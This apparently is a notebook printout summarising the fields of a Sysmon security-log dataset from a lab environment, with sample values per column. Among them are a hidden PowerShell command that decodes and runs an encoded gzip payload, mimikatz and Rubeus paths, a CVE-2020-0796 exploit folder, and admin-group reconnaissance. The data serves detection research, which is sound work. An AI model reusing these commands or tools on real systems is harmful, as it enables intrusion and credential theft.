      "RuleName                       ['nan', 'Sysmon_Event_3(NetworkConnect)', 'Context,DeviceConnectedOrUpdated', 'Sysmon_Event_1(ProcessCreate)', 'T1053', 'InvDB-Path', 'T1023', 'ModifyRemoteDesktopState', 'Alert,Sysinternals Tool Used', 'InvDB']\n",
      "UtcTime                        ['44:24.2', '42:06.2', '47:24.1', '38:27.0', '28:31.6', '36:48.2', '25:52.8', '33:10.2', '22:53.5', '22:23.3']\n",
      "ProcessGuid                    ['{27532e6a-ef27-61a5-f400-000000001700}', '{a190aab6-af9a-6390-8400-000000001e00}', '{a190aab6-f55f-63be-3200-000000003600}', '{a190aab6-09b7-639b-6800-000000001b00}', '{a190aab6-fa02-639a-3700-000000001a00}', '{a190aab6-1a60-639d-1700-000000002800}', '{a190aab6-4733-639c-c600-000000002700}', '{a190aab6-61ca-638f-7604-000000001c00}', '{a190aab6-1c8e-638e-1e02-000000001c00}', '{27532e6a-e9e2-61a9-7900-000000001900}']\n",
      "ProcessId                      ['3576.0', '3048.0', '6120.0', '4812.0', '3180.0', '436.0', '5516.0', '3460.0', '6552.0', '3876.0']\n",
      "Image                          ['C:\\\\Users\\\\ALTINI~1.STE\\\\AppData\\\\Local\\\\Temp\\\\vhjSBRkxzNz.exe', 'C:\\\\Users\\\\altinistef.STEFANIA\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.227.1030.0001\\\\FileSyncConfig.exe', 'C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\Install\\\\Windows-KB890830-x64-V5.109.exe', 'C:\\\\Windows\\\\System32\\\\wlms\\\\wlms.exe', 'C:\\\\Windows\\\\System32\\\\tzsync.exe', 'C:\\\\Windows\\\\System32\\\\notepad.exe', 'C:\\\\Windows\\\\system32\\\\regsvr32.exe', 'C:\\\\Users\\\\altinistef.STEFANIA\\\\Desktop\\\\CVE-2020-0796-RCE-POC\\\\tools\\\\link.exe', 'C:\\\\Users\\\\altinitat.STEFANIA\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.227.1030.0001\\\\FileSyncConfig.exe', 'C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\Install\\\\AM_Delta_Patch_1.381.521.0.exe']\n",
      "FileVersion                    ['1.379.951.0', '4.18.2110.6 (WinBuild.160101.0800)', '10.0.19041.1566 (WinBuild.160101.0800)', '4.8.4190.0 built by: NET48REL1LAST_B', '10.0.14321.1024 (debuggers(dbg).210127-1811)', '10.0.19041.1949 (WinBuild.160101.0800)', '10.0.14393.3297 (rs1_release_1.191001-1045)', '1.381.58.0', '10.0.14393.3503 (rs1_release.200131-0410)', '10.0.14393.2363 (rs1_release.180625-1741)']\n",
      "Description                    ['Credential Vault Client Library', 'Microsoft Antimalware WU Stub', 'RAS PLAP Credential Provider', 'Windows Logon Application', 'Microsoft OneDrive (64 bit) Setup', 'Windows Gaming Input API', 'Windows Features', 'Sink to receive asynchronous callbacks for WMI client application', 'Microsoft XmlLite Library', 'Microsoft Desktop Window Manager Redirection Component']\n",
      "Product                        ['Windows Drive Optimizer', 'nan', 'Rubeus', 'Microsoft Setup Bootstrapper', '2007 Microsoft Office system', 'Python', 'Internet Explorer', 'Apache HTTP Server', 'Windows (R) Win 7 DDK driver', 'Office Source Engine']\n",
      "Company                        ['Python Software Foundation', 'nan', 'Splunk Inc.', 'gentilkiwi (Benjamin DELPY)', 'Oracle Corporation', 'Microsoft Corp.', 'Sysinternals', 'Apache Software Foundation', 'Windows (R) Win 7 DDK provider', 'The OpenSSL Project, http://www.openssl.org/']\n",
      "OriginalFileName               ['REGEDIT.EXE', 'mfplat.dll', 'splunk-winprintmon.exe', 'TrustedInstaller.exe', 'ipconfig.exe', 'CONTROL.EXE', 'SAMCLI.DLL', 'slc.dll', 'system.transactions.dll', 'DevDispItemProvider.dll']\n",
      "CommandLine                    ['\"C:\\\\Windows\\\\system32\\\\defrag.exe\" -p 34 -s 00000000000009D0 -b -OnlyPreferred C:', '\"C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.XboxGamingOverlay_5.822.10271.0_x64__8wekyb3d8bbwe\\\\GameBarFTServer.exe\" -Embedding', '\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-US --service-sandbox-type=none --mojo-platform-channel-handle=4564 --field-trial-handle=2056,i,4152305477274176820,8620523121663762370,131072 /prefetch:8', '\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --mojo-platform-channel-handle=2068 --field-trial-handle=1916,i,14281395950088574081,10161112876108610809,131072 /prefetch:3', 'consent.exe 276 426 0000026FD59EC9A0', '\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=utility --mojo-platform-channel-handle=2356 --field-trial-handle=2044,i,1413821435695755471,16507231761416659504,131072 /prefetch:8', '\"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\" --type=renderer --instant-process --display-capture-permissions-policy-allowed --js-flags=--ms-user-locale= --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=89 --time-ticks-at-unix-epoch=-1670250280888440 --launch-time-ticks=44205913530 --mojo-platform-channel-handle=3760 --field-trial-handle=2136,i,16787519892399853665,9204729640996707359,131072 /prefetch:1', 'C:\\\\Windows\\\\System32\\\\Upfc.exe /launchtype periodic /cv fp+YUIFf70ai2LnNUR6URQ.0', '\"LogonUI.exe\" /flags:0x0 /state0:0xa3eb6055 /state1:0x41c64e6d', '\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\NGenTask.exe\" /RuntimeWide /Critical /StopEvent:408']\n",
      "CurrentDirectory               ['C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\1.3.171.37\\\\', 'C:\\\\Users\\\\ALTINI~1.STE\\\\AppData\\\\Local\\\\Temp\\\\EUA53E.tmp\\\\', 'C:\\\\Users\\\\ALTINI~1.STE\\\\AppData\\\\Local\\\\Temp\\\\EUF936.tmp\\\\', 'C:\\\\Windows\\\\', 'C:\\\\Windows\\\\Temp\\\\4C1DF9E8-CBFF-4151-B96E-548E52B0EE77-Sigs\\\\', 'C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\108.0.1462.42\\\\Installer\\\\', 'C:\\\\Tools\\\\x64\\\\', 'C:\\\\Program Files (x86)\\\\Microsoft\\\\Temp\\\\EU5A5B.tmp\\\\', 'C:\\\\Users\\\\Administrator\\\\Desktop\\\\', 'C:\\\\Users\\\\Administrator.ATTACKRANGE\\\\']\n",
      "User                           ['Font Driver Host\\\\UMFD-1', 'nan', 'SYSMON_SET\\\\chr.smilio', 'Window Manager\\\\DWM-4', 'NT AUTHORITY\\\\LOCAL SERVICE', 'NT AUTHORITY\\\\SYSTEM', 'Font Driver Host\\\\UMFD-0', '0', 'STEFANIA\\\\altinistef', 'Window Manager\\\\DWM-1']\n",
      "LogonGuid                      ['{a190aab6-547f-63be-e703-000000000000}', '{a190aab6-4453-639c-e503-000000000000}', '{a190aab6-99a8-638b-e403-000000000000}', '{27532e6a-8433-61a5-e403-000000000000}', '{a190aab6-c3c3-63b9-e703-000000000000}', '{a190aab6-5aba-6390-8463-060000000000}', '{a190aab6-565d-6385-e503-000000000000}', '{B81B27B7-4B39-61E8-E703-000000000000}', '{a190aab6-c889-6387-e503-000000000000}', '{a190aab6-d3d4-63be-72d0-000000000000}']\n",
      "LogonId                        ['0x45823', '0x6cf1', '0x8728d', '0x23c432', '0x25a35c', '0xd3c6', '0x9d0577e', '0xd1fb', '0x66384', '0x3e7']\n",
      "TerminalSessionId              ['nan', '3.0', '5.0', '1.0', '2.0', '4.0', '0.0']\n",
      "IntegrityLevel                 ['nan', '0', 'Low', 'System', 'AppContainer', 'Medium', 'High']\n",
      "Hashes                         ['MD5=5695F7E5FF71CCA19B5E81777D2FC869,SHA256=9776272A17233AC3D3506352B26B31FD924863FB2D4435D5C0314E5EE37D5810,IMPHASH=00000000000000000000000000000000', 'MD5=69C7AE5634DE801768ACB76C9BD2A4E8,SHA256=E4E0C2A575F33132F04278F4BF4438A6DD578A1B59E4347B95F96C05835D1EE9,IMPHASH=00000000000000000000000000000000', 'MD5=98F8717E21E03133AE80EAF22A0A7535,SHA256=703F7882D8C980E1FF73A4FC63B9CD87FF8B27C0C13F06B29B6EBCEA2CFD9EB3,IMPHASH=00000000000000000000000000000000', 'MD5=3DCBAE237E4E1F0EBE8E7DC053F778C4,SHA256=C3331CCBE71CC98A5F1BC013F1C0218FE194CA7B497DDF706BF9025AB5A7B330', 'MD5=E62973F200FA557193A57AA00316DFD7,SHA256=76BAFC49AE6E0B59BFBB79EF863147A84A931F87FE998CE01EEFBD98F386E769,IMPHASH=00000000000000000000000000000000', 'MD5=D191554EC9792A38D084F789F13DF799,SHA256=8D2ECCCFBA3F42C8356B7BD423D4FAD3EFC4FE2CD8A938E7C6AF7771983E7581,IMPHASH=00000000000000000000000000000000', 'MD5=FB641314AD61806FAA7042EC38C23FBA,SHA256=DB145B19EC7B6885995E54C7F5D57BE45FD3048C2377ADDA6240BAD3227C8348,IMPHASH=00000000000000000000000000000000', 'MD5=E3DE1589DA987C9BFE13083688988719,SHA256=29077D20EADC005535AE60C03FE349107AEE689E480ED635D9747BFDE2F0B1A9,IMPHASH=00000000000000000000000000000000', 'MD5=BC75130AF99EA1D834655AED7D10A4B6,SHA256=76E102E3034011860DD8E1C406BE1D06209AE65E685C80B3676E9BB9CDCCBD80,IMPHASH=00000000000000000000000000000000', 'MD5=CC092918B84FD14992A93C6B3A7B6387,SHA256=529EA58B2536DE0E4594BDDFE7DB63453F5F24306EE2D2989BF4A7D78140BFCA,IMPHASH=00000000000000000000000000000000']\n",
      "ParentProcessGuid              ['{27532e6a-2fa3-61af-0801-000000001d00}', '{27532e6a-9820-61a8-be00-000000001800}', '{a190aab6-cba3-6384-ca01-000000001600}', '{27532e6a-d9ef-61a5-2600-000000001700}', '{a190aab6-8bdc-638e-0500-000000001c00}', '{a190aab6-bfb9-63be-6c01-000000001e00}', '{a190aab6-5b70-6390-c400-000000001d00}', '{27532e6a-2eb0-61af-bf00-000000001d00}', '{a190aab6-6825-6387-6502-000000001800}', '{a190aab6-26ed-6389-ed01-000000001600}']\n",
      "ParentProcessId                ['6080.0', '4092.0', '492.0', '3576.0', '3048.0', '4940.0', '6120.0', '4812.0', '7360.0', '1176.0']\n",
      "ParentImage                    ['C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\Install\\\\AM_Delta_Patch_1.353.1952.0.exe', 'C:\\\\Users\\\\ALTINI~1.STE\\\\AppData\\\\Local\\\\Temp\\\\vhjSBRkxzNz.exe', 'C:\\\\Program Files\\\\Oracle\\\\VirtualBox Guest Additions\\\\Update\\\\VBoxWindowsAdditions-amd64.exe', 'C:\\\\Windows\\\\Temp\\\\9AC0D483-D5DE-4E61-9837-0C6B70EEF641\\\\MpSigStub.exe', 'C:\\\\Windows\\\\System32\\\\cleanmgr.exe', 'C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\Install\\\\Windows-KB890830-x64-V5.109.exe', 'C:\\\\Windows\\\\System32\\\\tzsync.exe', 'C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\Install\\\\{B26F6B19-6D6E-4B2D-9B90-C4438D9544FF}\\\\MicrosoftEdge_X64_108.0.1462.76_108.0.1462.46.exe', 'C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\Install\\\\AM_Delta_Patch_1.381.521.0.exe', 'C:\\\\Windows\\\\SoftwareDistribution\\\\Download\\\\Install\\\\Windows-KB890830-x64-V5.108.exe']\n",
      "ParentCommandLine              ['C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p', '\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4.18.2110.6-0\\\\MpCmdRun.exe\" SignatureUpdate -ScheduleJob -RestrictPrivileges', 'C:\\\\Windows\\\\System32\\\\Upfc.exe /launchtype periodic /cv fp+YUIFf70ai2LnNUR6URQ.0', 'C:\\\\Windows\\\\system32\\\\cmd.exe /c \"\"C:\\\\Users\\\\altinistef.STEFANIA\\\\Desktop\\\\CVE-2020-0796-RCE-POC\\\\calc_target_offsets.bat\" \"', '\"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\NGenTask.exe\" /RuntimeWide /StopEvent:596', '\"C:\\\\Program Files (x86)\\\\Microsoft\\\\EdgeUpdate\\\\Install\\\\{0AF6D023-3964-40E7-AEAD-233A0FE93426}\\\\MicrosoftEdge_X64_108.0.1462.54.exe\" --msedgewebview --verbose-logging --do-not-launch-msedge --system-level', '\"C:\\\\Users\\\\altinistef.STEFANIA\\\\Downloads\\\\winrar-x32-611.exe\" ', '\"C:\\\\Windows\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" -noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(\\'H4sIAGz5qWECA7VWbW+bSBD+nEj5D6iyBKiOwTbXNJEq3QLGdhM7OMTvZ53WsIZtFtaBdRyn1/9+gw1pqqZ37UmH/LIvM7szzzwzw2qT+ILyRHryvDPp88nxkYtTHEtK5UlUpUpaX5uWenQE6xUsQr8vfZCUOVqvbR5jmiwuLqxNmpJEHOa1NhEoy0i8ZJRkiir9JY0jkpLT6+Un4gvps1T5s9ZmfIlZIbazsB8R6RQlQb53xX2cm1Pz1owKRf7jD1mdn9YXtdb9BrNMkb1dJkhcCxiTVemLml94u1sTRe5RP+UZX4namCbNRm2YZHhF+nDaA+kREfEgk1VwAz4pEZs0kQ4O5Scc9hUZhm7KfRQEKckyuSrN87Pni8Xvyry4+GaTCBqTWjcRJOVrj6QP1CdZrYOTgJEbslqAlidSmoQLVQWxB35HlEqyYawq/coxSp9sS9h+Vkl5qQRSrkjVKoTyNUd7PNgwclCVX7EU4q/C88wBwO7LyfHJ8aokzKObvuQLjI7m+zEB6xSXZ3Qv9kHSq1IPrsGCpzuYVm7TDVEXz9hCHJbVH2vXS1EQDNysRWFtPuI0WIBOEdAKj/LVH9PSJiuaEHuX4Jj6JfOU1yAmK0b2/tVKsT7YpMjFBglswkiIRY5ZHunv1FoxFc+65oaygKTIhzBlYBVEUP3WmEMYFLmb9EgMAB3mQL3KCvhOSumC47vy9nwOQrLFcJZVJXcDCedXJY9gRoKqhJKMFltoI/h+KH81t7dhgvo4E+VxC/WAYnGbxZNMpBsfIgae33pr4lPMciCqUocGxNx5NCxvlV+FwcKMQQ7ASQ8QBljJ3fdEzoMUDISYqzWPiG68ZiQGiX3WOwyHkOMFz/e0wSEJ5G+tK0l8YGyOQun+C9sgtB7jUMJGNBVQOnJE9/T5L3e/qBlghZWSIgJKmRRzcydyLleWs5yIBRx751MBjjspj02ckXfGoTQob7Rr6iJ4pnbHm3WF1+smjNa7PfgO7bPg8uOnjkabXd7zrcxtO+8R3YZb/30f+cHHgJx7IDcYGcJyUWdAddOIfFO/3Y/DKa2HIQr6g8hnutuKr/rd7FHbdsY93zafto0M6GgYnYmOmk3juqnfAWi5zh3oxHT7eAVjqIHXV2Y3M/Uua320bpbjhjMbs45mONFqzDPv3dTWNO08wHZvh5DJg2ZvN6nf8NuOH5tGwrVzy7hDLYSspDVyTH45NVPkaiMcrvn2MjTtOLSQ6fiUzAZDxxwMHBMN25/u7XMt1M7HExyZ41GDztaTmwjmzrYzuNR0oxuQJz7bAnBtjnB4AzKh1fCjFcjYb5H5ts+zBr4zOTJBxpndo3Y0XTsug/3bYYOjEetPMLqa7RxNq09dA3V0Pm6HaADiODQHGGUP9pOt1UcBD8a/9acrbTRhZ5ptDdxokvusreP8d9uxL/1Zfetfnxmmfm/FNGbLRqCdD9+bCXjoPoTBYHx289jfLeHeoaaN3uRcAjJVHo175/YFUX5U2Hs4zSLMgEBQsMtcdXjqFDXY5TTXUJR9874jaUIYtD5ojiXtEWPcz3tAXq2h/RyaQt6jhjBsNl4dqdKzoPq1M5RLFxczMBLSaDmrXZEkFFFVf2zqOpR5/dHQwcefd8vi650CB1XzJnGA5XAw2x+s5rlVEd21cfX/olWkdAR/wb+g9XXtH3Z/CkG9Wnj83fq3C7+E6C+7PsZUgKQHVYmRQzN8FYGCGi/eFPZxgdiviid/27veiNM+vEGcHP8N1MWl0lkKAAA=\\'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))', 'net  localgroup administrators', 'C:\\\\Windows\\\\system32\\\\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun -cv:DJLsIyKvXkunqcua.1']\n",
      "ParentUser                     ['nan', 'NT AUTHORITY\\\\LOCAL SERVICE', 'NT AUTHORITY\\\\SYSTEM', '0', 'Window Manager\\\\DWM-1', 'ATTACKRANGE\\\\REED_SCHMIDT', 'STEFANIA\\\\altinistef', '-', 'NT AUTHORITY\\\\NETWORK SERVICE', 'STEFANIA\\\\altinitat']\n",
      "Protocol                       ['nan', 'udp', '0', 'tcp']\n",
      "Initiated                      ['nan', 'False', '0', 'True']\n",
      "SourceIsIpv6                   ['nan', 'False', '0', 'True']\n",
      "SourceIp                       ['192.168.1.255', 'nan', '192.168.1.8', '224.0.0.252', 'ff02:0:0:0:0:0:0:fb', '192.168.156.255', '192.168.1.6', 'ff02:0:0:0:0:0:0:c', '192.168.98.2', 'a00:10f:0:0:c850:983b:9ce:ffff']\n",
      "SourceHostname                 ['kali', 'nan', 'win-dc-128.attackrange.local', 'windev2011eval', 'WinDev2011Eval', 'laptop-ropr18ak', 'ip-10-0-1-15.us-west-2.compute.internal', 'win-host-987.attackrange.local', 'ip-10-0-1-255.us-west-2.compute.internal', '0']\n",
      "SourcePort                     ['51770.0', '63685.0', '52327.0', '59353.0', '52178.0', '50761.0', '50442.0', '63683.0', '42752.0', '51890.0']\n",
      "SourcePortName                 ['nan', 'netbios-ns', 'dhcpv6-client', 'ws-discovery', '0', 'domain', 'llmnr', 'bootpc', 'ntp', 'ssdp']\n",
      "DestinationIsIpv6              ['nan', 'False', '0', 'True']\n",
      "DestinationIp                  ['38.27.122.126', '69.169.85.6', '20.189.173.5', '13.107.4.50', '20.228.200.50', '52.109.68.59', '151.101.129.21', '52.142.186.92', '51.11.192.48', '192.168.1.12']\n",
      "DestinationHostname            ['kali', 'nan', 'mi-10', 'a104-109-93-180.deploy.static.akamaitechnologies.com', 'a2-21-69-161.deploy.static.akamaitechnologies.com', 'a2-19-106-148.deploy.static.akamaitechnologies.com', 'a23-222-48-85.deploy.static.akamaitechnologies.com', 'win-dc-128.attackrange.local', 'fra24s12-in-f4.1e100.net', 'a104-125-31-18.deploy.static.akamaitechnologies.com']\n",
      "DestinationPort                ['54873.0', '63685.0', '58005.0', '62773.0', '65066.0', '63683.0', '51508.0', '58795.0', '61469.0', '64939.0']\n",
      "DestinationPortName            ['nan', 'ws-discovery', 'dhcpv6-server', 'ldap', 'kerberos', 'microsoft-ds', 'llmnr', 'msft-gc', 'epmap', 'ntp']\n",
      "State                          ['nan', 'Started', '0']\n",
      "Version2                       ['13.24', 'nan', '0.0', '13.3']\n",
      "SchemaVersion                  ['nan', '4.83', '4.7', '4.81', '0.0']\n",
      "Configuration                  ['nan', 'C:\\\\Users\\\\altinitat.STEFANIA\\\\Downloads\\\\Sysmon\\\\sysmonconfig1.xml', 'C:\\\\Users\\\\altinistef.STEFANIA\\\\Downloads\\\\Sysmon\\\\Sysmon64.exe  -accepteula -i', '0', 'C:\\\\Users\\\\altinitat.STEFANIA\\\\Downloads\\\\Sysmon\\\\Sysmon64.exe  -accepteula -i', 'C:\\\\Users\\\\altinistef.STEFANIA\\\\Downloads\\\\Sysmon\\\\sysmonconfig1.xml', '0.0']\n",
      "ConfigurationFileHash          ['nan', '0', 'SHA256=D8403434F116898DF95BA346905D5AF1DF99249E13298B430F16063A68CDF58E', 'SHA256=BE2EEF7710D2D276F482FC73A2039D653D5AB3F24657307DC3759783F9A86253', '0.0', '-']\n",
      "ImageLoaded                    ['C:\\\\Windows\\\\System32\\\\xmllite.dll', 'C:\\\\Windows\\\\System32\\\\advapi32.dll', 'C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\System.Data\\\\f27dd71df7a6fe3f43a9e7a7c4e1870c\\\\System.Data.ni.dll', 'C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\Microsoft.CSharp\\\\9311b6c382518fe61794f144e07fef90\\\\Microsoft.CSharp.ni.dll', 'C:\\\\Windows\\\\System32\\\\dxgi.dll', 'C:\\\\Windows\\\\System32\\\\dbgcore.dll', 'C:\\\\Windows\\\\System32\\\\WindowsCodecs.dll', 'C:\\\\Windows\\\\System32\\\\ExecModelClient.dll', 'C:\\\\Windows\\\\System32\\\\deviceassociation.dll', 'C:\\\\Windows\\\\System32\\\\shacct.dll']\n",
      "Signed                         ['nan', 'True', '0', 'False', '0.0']\n",
      "Signature                      ['Splunk, Inc.', 'nan', '0', 'Microsoft Windows Publisher', 'Microsoft Windows', 'Microsoft Corporation', '0.0', '-', 'Open Source Developer, Benjamin Delpy']\n",
      "SignatureStatus                ['nan', 'Valid', '0', '0.0', 'Unavailable']\n",
      "SourceProcessGUID              ['{B81B27B7-F667-6183-2200-00000000CA01}', '{3BF36828-60C3-619D-6ECD-02000000CC01}', '{F17A0B6A-3429-5F88-A800-000000007F01}', '{B81B27B7-4B3A-61E8-2100-00000000CE01}', '{B81B27B7-F665-6183-0B00-00000000CA01}', '{B81B27B7-AC0A-618E-9043-01000000CA01}', '{3BF36828-AC84-618E-3F12-01000000CC01}', '{B81B27B7-AED0-61F9-B10B-02000000CE01}', '{B81B27B7-3032-6194-851F-00000000CC01}', '{B81B27B7-4B39-61E8-0D00-00000000CE01}']\n",
      "SourceProcessId                ['6080.0', '3576.0', '3048.0', '1176.0', '436.0', '3180.0', '3248.0', '1320.0', '5920.0', '4500.0']\n",
      "SourceThreadId                 ['3576.0', '988.0', '436.0', '5516.0', '1572.0', '3460.0', '2156.0', '4772.0', '3112.0', '5896.0']\n",
      "SourceImage                    ['nan', 'C:\\\\Users\\\\Administrator\\\\Downloads\\\\mimikatz_trunk\\\\x64\\\\mimikatz.exe', 'C:\\\\Windows\\\\System32\\\\VBoxTray.exe', 'C:\\\\Windows\\\\system32\\\\WinrsHost.exe', 'C:\\\\Users\\\\ALTINI~1.STE\\\\AppData\\\\Local\\\\Temp\\\\GXeiPg.exe', 'C:\\\\Windows\\\\system32\\\\cmd.exe', 'C:\\\\Tools\\\\Rubeus.exe', 'C:\\\\Windows\\\\system32\\\\lsass.exe', 'C:\\\\Windows\\\\system32\\\\LogonUI.exe', 'C:\\\\Windows\\\\Explorer.EXE']\n",
      "TargetProcessGUID              ['{B81B27B7-BB79-61F9-590D-02000000CE01}', '{B81B27B7-F667-6183-2200-00000000CA01}', '{3BF36828-A908-6202-4100-00000000D101}', '{3BF36828-60C3-619D-6ECD-02000000CC01}', '{3BF36828-A906-6202-3400-00000000D101}', '{F17A0B6A-3429-5F88-A800-000000007F01}', '{B81B27B7-4B3A-61E8-2100-00000000CE01}', '{B81B27B7-F665-6183-0B00-00000000CA01}', '{3BF36828-910A-619D-36D3-02000000CC01}', '{B81B27B7-AC0A-618E-9043-01000000CA01}']\n",
      "TargetProcessId                ['4092.0', '492.0', '3576.0', '3048.0', '1176.0', '988.0', '4780.0', '1120.0', '436.0', '3180.0']\n",
      "TargetImage                    ['C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\etc\\\\apps\\\\Splunk_TA_stream\\\\windows_x86_64\\\\bin\\\\streamfwd.exe', 'C:\\\\Users\\\\Public\\\\splunkd.exe', 'C:\\\\Windows\\\\System32\\\\SearchProtocolHost.exe', 'C:\\\\Windows\\\\System32\\\\InstallAgent.exe', 'C:\\\\windows\\\\system32\\\\rundll32.exe', 'C:\\\\Windows\\\\system32\\\\ocspsvc.exe', 'C:\\\\Windows\\\\ADWS\\\\Microsoft.ActiveDirectory.WebServices.exe', 'C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunk-admon.exe', 'C:\\\\Windows\\\\System32\\\\lpremove.exe', 'C:\\\\Windows\\\\sysmon64.exe']\n",
      "GrantedAccess                  ['nan', '0x40', '0x101001', '0x100000', '0x101400', '0x1400', '0x1fffff', '0x1410', '0x3200', '0x14c0']\n",
      "CallTrace                      ['C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a7404|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+2b860|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+6b246|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+1c213|C:\\\\Windows\\\\System32\\\\windows.storage.dll+16e61f|C:\\\\Windows\\\\System32\\\\windows.storage.dll+16e295|C:\\\\Windows\\\\System32\\\\windows.storage.dll+16dd86|C:\\\\Windows\\\\System32\\\\windows.storage.dll+16f1f8|C:\\\\Windows\\\\System32\\\\windows.storage.dll+16dbae|C:\\\\Windows\\\\System32\\\\windows.storage.dll+fd025|C:\\\\Windows\\\\System32\\\\windows.storage.dll+fd3a4|C:\\\\Windows\\\\System32\\\\windows.storage.dll+fc9e0|C:\\\\Windows\\\\System32\\\\windows.storage.dll+1664ae|C:\\\\Windows\\\\System32\\\\windows.storage.dll+1661a2|C:\\\\Windows\\\\System32\\\\SHELL32.dll+90ee1|C:\\\\Windows\\\\System32\\\\SHELL32.dll+8fd46|C:\\\\Windows\\\\System32\\\\SHELL32.dll+d0c11|C:\\\\Windows\\\\System32\\\\SHELL32.dll+b6e2e|C:\\\\Windows\\\\System32\\\\windows.storage.dll+2d1a2|C:\\\\Windows\\\\System32\\\\windows.storage.dll+2ce99|C:\\\\Windows\\\\System32\\\\windows.storage.dll+2cd6f|C:\\\\Windows\\\\System32\\\\SHELL32.dll+d0c97|C:\\\\Windows\\\\System32\\\\SHELL32.dll+b6e2e|C:\\\\Windows\\\\System32\\\\SHELL32.dll+1721db', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+5eab4|c:\\\\windows\\\\system32\\\\lsm.dll+e9d6|c:\\\\windows\\\\system32\\\\lsm.dll+8b22|c:\\\\windows\\\\system32\\\\lsm.dll+8a76|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+7a593|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+d9f41|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+62d4c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+4a274|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+4918d|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+49a3b|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+310ac|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+3152c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+1ae1c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+1c67b|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+43a2a|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+1d34e|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+1ecb9|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+221bd|C:\\\\Windows\\\\SYSTEM32\\\\twinapi.appcore.dll+1ea06|C:\\\\Windows\\\\SYSTEM32\\\\twinapi.appcore.dll+1e3d1|C:\\\\Windows\\\\SYSTEM32\\\\twinapi.appcore.dll+1dbcc|C:\\\\Windows\\\\SYSTEM32\\\\twinapi.appcore.dll+1d777|C:\\\\Windows\\\\System32\\\\TwinUI.dll+109196|C:\\\\Windows\\\\System32\\\\TwinUI.dll+82af7|C:\\\\Windows\\\\System32\\\\TwinUI.dll+beb2e|C:\\\\Windows\\\\System32\\\\TwinUI.dll+beaf9|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+221bd|C:\\\\Windows\\\\System32\\\\SHELL32.dll+15d19|C:\\\\Windows\\\\System32\\\\SHELL32.dll+b1b50|C:\\\\Windows\\\\System32\\\\SHELL32.dll+b3057|C:\\\\Windows\\\\explorer.exe+3c618|C:\\\\Windows\\\\explorer.exe+3c4a4|C:\\\\Windows\\\\explorer.exe+3c411|C:\\\\Windows\\\\System32\\\\windows.storage.dll+13bd5f|C:\\\\Windows\\\\System32\\\\windows.storage.dll+13aaeb|C:\\\\Windows\\\\System32\\\\windows.storage.dll+13900f|C:\\\\Windows\\\\System32\\\\SHCORE.dll+367a6|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+39cf9|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+1e88a|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781', 